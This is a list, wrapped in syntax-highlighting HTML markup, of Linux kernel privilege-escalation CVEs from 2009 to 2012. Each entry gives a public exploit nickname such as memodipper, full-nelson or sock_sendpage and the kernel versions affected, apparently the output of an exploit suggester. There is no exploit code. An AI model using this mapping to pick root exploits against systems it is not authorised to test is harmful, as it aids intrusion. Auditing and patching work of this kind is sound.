CVE<span class="token operator">-</span><span class="token number">2012</span><span class="token operator">-</span><span class="token number">0056</span> <span class="token punctuation">[</span>memodipper<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.39</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">3.1</span><span class="token number">.0</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">4347</span> <span class="token punctuation">[</span>american<span class="token operator">-</span>sign<span class="token operator">-</span>language<span class="token punctuation">]</span> <span class="token punctuation">(</span> <span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">4258</span> <span class="token punctuation">[</span>full<span class="token operator">-</span>nelson<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.37</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">4073</span> <span class="token punctuation">[</span>half_nelson<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">3904</span> <span class="token punctuation">[</span>rds<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">3437</span> <span class="token punctuation">[</span>pktcdvd<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">3301</span> <span class="token punctuation">[</span>ptrace_kmod2<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">3081</span> <span class="token punctuation">[</span>video4linux<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">2959</span> <span class="token punctuation">[</span>can_bcm<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.36</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">1146</span> <span class="token punctuation">[</span>reiserfs<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.34</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2010</span><span class="token operator">-</span><span class="token number">0415</span> <span class="token punctuation">[</span>do_pages_move<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2009</span><span class="token operator">-</span><span class="token number">3547</span> <span class="token punctuation">[</span>pipe<span class="token punctuation">.</span>c_32bit<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.4</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.13</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.25</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.28</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.36</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.37</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.31</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2009</span><span class="token operator">-</span><span class="token number">2698</span> <span class="token punctuation">[</span>udp_sendmsg_32bit<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.6</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span>  <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">)</span>
CVE<span class="token operator">-</span><span class="token number">2009</span><span class="token operator">-</span><span class="token number">2692</span> <span class="token punctuation">[</span>sock_sendpage<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token number">2.4</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.12</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.13</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.16</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.28</span><span class="token punctuation">,</span><span class="token number">2.4</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.30</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.31</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.32</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.33</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.34</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.35</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.36</span><span class="token punctuation">,</span> <span class="token number">2.4</span><span class="token number">.37</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.0</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.1</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.3</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.4</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.5</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.6</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.7</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.8</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.9</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.10</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.11</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.12</span><span class="token punctuation">,</span><span class="token number">2.6</span><span class="token number">.13</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.14</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.15</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.16</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.17</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.18</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.19</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.20</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.21</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.22</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.23</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.24</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.25</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.26</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.27</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.28</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.29</span><span class="token punctuation">,</span> <span class="token number">2.6</span><span class="token number">.30</span><span class="token punctuation">)</span>
